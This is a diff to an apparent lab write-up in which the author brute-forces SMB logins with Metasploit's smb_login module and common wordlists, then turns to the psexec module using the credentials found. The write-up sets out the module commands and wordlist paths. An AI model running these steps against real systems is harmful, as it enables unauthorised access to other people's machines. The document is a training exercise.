@@ -75,7 +75,7 @@ There's is something runnng on port 445, SMB uses port 445. Alo we can seethe me
 ┌──(root㉿INE)-[~]
 └─# service postgresql start && msfconsole
 ```
-after loking the module, we will look for the options of the module and configure them
+after loking the module, we will look for the options of the module and configure them and run the module
 
 <img width="1840" height="935" alt="Screenshot 2026-01-26 at 10 55 04 PM" src="https://github.com/user-attachments/assets/518043cf-ab2d-48a7-b96b-103eaa0b1fb6" />
 
@@ -87,9 +87,15 @@ USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
 msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 ```
+As a result, we obtained 4 credentials for different users
 
+<img width="1140" height="210" alt="Screenshot 2026-01-26 at 11 08 18 PM" src="https://github.com/user-attachments/assets/1276fe45-74d0-4e60-aa32-ba97e9692408" />
 
+Let's use the MSF module for the exploit ow that we get the credentials: `exploit/windows/smb/psexec` 
 
+<img width="1660" height="371" alt="Screenshot 2026-01-26 at 11 12 00 PM" src="https://github.com/user-attachments/assets/64d74d37-41b2-428f-bb5e-58f31ac3f9d0" />
+
+<img width="784" height="138" alt="Screenshot 2026-01-26 at 11 13 54 PM" src="https://github.com/user-attachments/assets/adc90f9e-b1f2-457a-a971-70415f567208" />
 
 
 
